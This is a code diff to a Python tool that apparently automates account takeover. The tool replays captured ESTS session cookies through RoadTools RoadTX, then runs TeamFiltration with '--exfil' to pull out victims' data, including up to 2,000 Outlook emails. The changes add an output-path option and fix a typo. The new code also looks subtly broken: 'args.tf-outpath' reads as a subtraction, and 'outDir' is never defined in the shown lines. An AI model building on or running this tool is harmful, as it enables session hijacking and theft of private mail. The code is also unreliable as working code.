@@ -160,7 +160,7 @@ def download_remote_file(ssh, remote_file, local_file):
     except Exception as e:
         print(f"{ERROR_ICON} Failed to download file: {e}")
 
-def execute_authentication(estscookie, username, resourceUri, clientId, redirectUrl, geckoDriverPath, teamFiltrationPath, keepOpen, headless):
+def execute_authentication(estscookie, username, resourceUri, clientId, redirectUrl, geckoDriverPath, teamFiltrationPath, keepOpen, headless, outpath):
     # Attempt to execute the authentication process
     try:
         # Informing the user about the start of the process
@@ -223,7 +223,7 @@ def execute_authentication(estscookie, username, resourceUri, clientId, redirect
             teamFiltrationPath = os.path.join(os.getcwd(), teamFiltrationPath)
             
             #Build the command line
-            commandLine = f"{teamFiltrationPath} --outpath {safeUserName} --roadtools {outfilePath} --exfil "
+            commandLine = f"{teamFiltrationPath} --outpath {outDir}{safeUserName} --roadtools {outfilePath} --exfil "
             commandLine += " ".join(tfArguments)
 
             print(f"{INFO_ICON} Executing: {commandLine}")
@@ -370,6 +370,7 @@ if __name__ == "__main__":
     teamfiltration_group.add_argument('--owa', action='store_true', help='Exfiltrate information from the Outlook REST API (The last 2k emails, both sent and received)')
     teamfiltration_group.add_argument('--owa-limit', type=int, help='Set the max amount of emails to exfiltrate, default is 2k.')
     teamfiltration_group.add_argument('--tf-path', action='store', help='Path to your TeamFiltration file on disk (download from https://github.com/Flangvik/TeamFiltration/releases/latest)',default=default_teamfiltration_filename())
+    teamfiltration_group.add_argument('--tf-outpath', action='store', help='Path to your TeamFiltration output folder',default="./")
 
     
     roadtools_group = arg_parser.add_argument_group('RoadTools Options', description='RoadTools RoadTX interactive authentication options')
@@ -387,7 +388,7 @@ if __name__ == "__main__":
 
 
     if not is_dependency_present(args.driver_path):
-        print(f'{ERROR_ICON} Geckdriver not found! Required for RoadTools RoadTX, download from https://github.com/mozilla/geckodriver/releases/latest')
+        print(f'{ERROR_ICON} Geckodriver not found! Required for RoadTools RoadTX, download from https://github.com/mozilla/geckodriver/releases/latest')
         exit(0)
     
     if args.user_key and args.api_token:
@@ -433,5 +434,5 @@ if __name__ == "__main__":
             initial_combinations = process_combinations(valid_json_objects, processed_combinations)
             for key, tokenData in initial_combinations.items():
                 with ThreadPoolExecutor() as executor:
-                    executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.tf_path, args.keep_open, args.headless)
+                    executor.submit(execute_authentication, tokenData, key.split(':')[0], args.resource, args.client, args.redirect_url, args.driver_path, args.tf_path, args.keep_open, args.headless, args.tf-outpath)
             time.sleep(600)
